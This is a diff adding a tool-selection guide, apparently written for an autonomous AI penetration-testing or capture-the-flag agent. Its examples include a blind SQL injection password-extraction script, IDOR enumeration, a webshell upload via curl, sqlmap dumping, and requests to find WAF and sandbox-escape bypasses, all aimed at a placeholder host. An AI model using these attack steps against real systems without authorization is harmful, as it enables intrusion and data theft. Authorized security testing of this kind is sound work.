@@ -1,0 +1,290 @@
+### Tool Selection & Action Decision Guide
+
+## Tool Selection Decision Tree
+
+### Scenario A: Quick probing, single-step verification, or API calls
+**Select**: `http_request`
+
+**Applicable Situations**:
+- Fetching web page content
+- Submitting forms (login, registration, search)
+- Testing a single simple payload
+- Verifying a single HTTP request's response
+
+**Example**:
+```json
+{
+  "tool": "http_request",
+  "params": {
+    "url": "http://target.com/search?q={{7*7}}",
+    "method": "GET"
+  }
+}
+```
+
+### Scenario B: Systematic, iterative, or response-logic-dependent testing
+**Select**: `python_exec` (mandatory)
+
+**Applicable Situations**:
+- Filter character set fuzzing
+- SQL blind injection character-by-character extraction
+- Parameter brute-force or enumeration
+- IDOR batch testing
+- Any scenario requiring loops, conditionals
+- Tests requiring saving intermediate results or evidence
+
+**Important**: Do not use multiple `http_request` calls to simulate loops
+
+**Example**:
+```json
+{
+  "tool": "python_exec",
+  "params": {
+    "code": "import requests\nchars = ['a', 'b', 'c']\nfor char in chars:\n    r = requests.get(f'http://target.com/test?q={char}')\n    print(f'{char}: {r.status_code}')"
+  }
+}
+```
+
+### Scenario C: System command execution
+**Select**: `shell_exec`
+
+**Applicable Situations**:
+- One-time system command execution
+- Calling external tools (curl, nmap, sqlmap, etc.)
+- File operations (cat, ls, find)
+
+**Priority & Security Considerations**:
+- Prefer non-destructive information gathering commands (e.g., `id`, `whoami`, `hostname`, `ls -la /tmp`).
+- Only attempt potentially destructive or exploitative commands (e.g., reverse shells) when the target environment is confirmed safe and properly authorized.
+
+**Example**:
+```json
+{
+  "tool": "shell_exec",
+  "params": {
+    "command": "curl -X POST http://target.com/upload -F 'file=@shell.php'"
+  }
+}
+```
+
+### Scenario D: Specialized knowledge or specific technical details needed
+**Select**: `expert_analysis`
+
+**Applicable Situations**:
+- Encountering specific WAF requiring bypass techniques
+- Framework-specific payloads needed
+- All standard methods failed, advanced techniques required
+- Latest vulnerability exploitation methods needed
+
+**Example**:
+```json
+{
+  "tool": "expert_analysis",
+  "params": {
+    "query": "Jinja2 SSTI sandbox escape latest bypass techniques",
+    "context": "Confirmed Jinja2 template injection, {{7*7}} returns 49, but {{config}} is filtered"
+  }
+}
+```
+
+### Scenario E: Historical experience or general knowledge retrieval
+**Select**: `retrieve_knowledge`
+
+**Applicable Situations**:
+- Querying common CTF patterns
+- Querying testing methods for specific vulnerability types
+- Querying tool usage documentation
+
+**Example**:
+```json
+{
+  "tool": "retrieve_knowledge",
+  "params": {
+    "query": "SQL injection filter bypass techniques"
+  }
+}
+```
+
+## Tool Selection Philosophy
+
+### Information Gathering First
+- Before any attack attempt, prioritize fully understanding code logic and application structure
+- Recommended tools: `http_request` for page retrieval, `shell_exec` for file reading
+
+### Precision > Coverage
+- Prefer tools that precisely verify a single hypothesis
+- Avoid: broad scanning tools (unless clearly justified)
+
+### Controllability
+- Prefer tools with clear, easily parseable and verifiable output
+- For long-running commands, must use non-blocking mode with status checks
+
+### Knowledge Retrieval/Expert Analysis as Backup
+- When built-in tools and basic payloads fail to make progress
+- Or when encountering specific WAF, framework, or encoding issues
+- Must use `retrieve_knowledge` → `expert_analysis` for the latest, more specific attack techniques
+
+### Encoding & Filter Verification
+- When needing to verify "encoding/raw sending/filter effects"
+- Prefer `http_request` with `raw_mode` and appropriate `Content-Type`
+- Batch variants and differential analysis must use `python_exec` for scripted iteration
+
+## Special Scenario Tool Selection
+
+### Blind Injection Scenarios
+**Must use**: `python_exec`
+
+**Reason**: Requires loops, conditionals, result aggregation
+
+**Example**: Boolean blind injection character-by-character extraction
+```python
+import requests
+result = ""
+for i in range(1, 20):
+    for c in range(32, 127):
+        payload = f"admin' AND ASCII(SUBSTR(password,{i},1))={c}--"
+        r = requests.get(f"http://target.com/login?user={payload}")
+        if "Welcome" in r.text:
+            result += chr(c)
+            break
+print(f"Extracted: {result}")
+```
+
+### Filter Fuzzing
+**Must use**: `python_exec`
+
+**Reason**: Requires batch testing and result recording
+
+**Example**: Character filter testing
+```python
+import requests
+chars = ["'", '"', '<', '>', '{', '}', ';', '|']
+for char in chars:
+    r = requests.get(f"http://target.com/search?q=test{char}test")
+    print(f"{char}: status={r.status_code}, len={len(r.text)}")
+```
+
+### Parameter Enumeration (IDOR)
+**Must use**: `python_exec`
+
+**Reason**: Requires looping through multiple ID values
+
+**Example**: User ID enumeration
+```python
+import requests
+for user_id in range(1, 100):
+    r = requests.get(f"http://target.com/profile?id={user_id}")
+    if r.status_code == 200 and "email" in r.text:
+        print(f"Found: id={user_id}")
+```
+
+### Single Payload Verification
+**May use**: `http_request`
+
+**Reason**: Only one request needed
+
+**Example**: SSTI probe
+```json
+{
+  "tool": "http_request",
+  "params": {
+    "url": "http://target.com/render?template={{7*7}}",
+    "method": "GET"
+  }
+}
+```
+
+### Calling Automated Tools
+**Use**: `shell_exec`
+
+**Example**: Calling sqlmap
+```json
+{
+  "tool": "shell_exec",
+  "params": {
+    "command": "sqlmap -u 'http://target.com/search?id=1' --batch --dump"
+  }
+}
+```
+
+## Anti-Patterns (Note & Avoid)
+
+### ❌ Vector Fixation
+**Problem**: After consecutive failures on one injection point, repeatedly trying similar payloads
+
+**Correct approach**: 
+- Stop immediately and re-evaluate
+- Switch to different parameters, features, or vulnerability hypotheses
+- Or trigger knowledge retrieval/expert analysis
+
+### ❌ Assumption Leap
+**Problem**: Jumping directly to complex attacks based on weak evidence
+
+**Bad example**: Found open port 80 → Directly attempt Webshell upload
+
+**Correct flow**: 
+1. Information gathering (get pages, identify tech stack)
+2. Vulnerability identification (discover upload functionality)
+3. Vulnerability verification (test file type filtering)
+4. Vulnerability exploitation (upload Webshell)
+
+### ❌ Simulating Loops with Multiple http_request
+**Problem**: 
+```json
+[
+  {"tool": "http_request", "params": {"url": "...?id=1"}},
+  {"tool": "http_request", "params": {"url": "...?id=2"}},
+  {"tool": "http_request", "params": {"url": "...?id=3"}}
+]
+```
+
+**Correct approach**: Use `python_exec` for loops
+
+### ❌ Tool Calls Without Hypotheses
+**Problem**: "Let's try an nmap scan" (no clear hypothesis)
+
+**Correct approach**: "Hypothesis: target has open database ports, use nmap -p 3306,5432,27017 to verify"
+
+## Decision Flowchart
+
+```
+Start
+ ↓
+Is there a clear hypothesis?
+ ├─ No → Stop, form a hypothesis first
+ └─ Yes ↓
+     Need loops/iteration?
+      ├─ Yes → Use python_exec
+      └─ No ↓
+          Need system commands?
+           ├─ Yes → Use shell_exec
+           └─ No ↓
+               Single HTTP request?
+                ├─ Yes → Use http_request
+                └─ No ↓
+                    Need specialized knowledge?
+                     ├─ Yes → Use expert_analysis
+                     └─ No → Use retrieve_knowledge
+```
+
+## Early Stopping & Switching Mechanisms
+
+### Early Stop Triggers
+- No new evidence for two consecutive rounds
+- No status changes for two consecutive rounds
+- Hypothesis falsified (L4_FALSIFIED)
+
+### Switching Strategy
+1. Perform failure attribution (L0-L5)
+2. Based on attribution results:
+   - L1/L2 → Fix tool call or prerequisites
+   - L3 → Switch bypass strategy or attack vector
+   - L4 → Form new hypothesis
+   - L5 → Request Planner replanning
+
+### Knowledge Retrieval Escalation
+- After standard methods fail
+- When encountering specific tech stack/WAF
+- When latest bypass techniques are needed
+
+Trigger: `retrieve_knowledge` → If still ineffective → `expert_analysis`
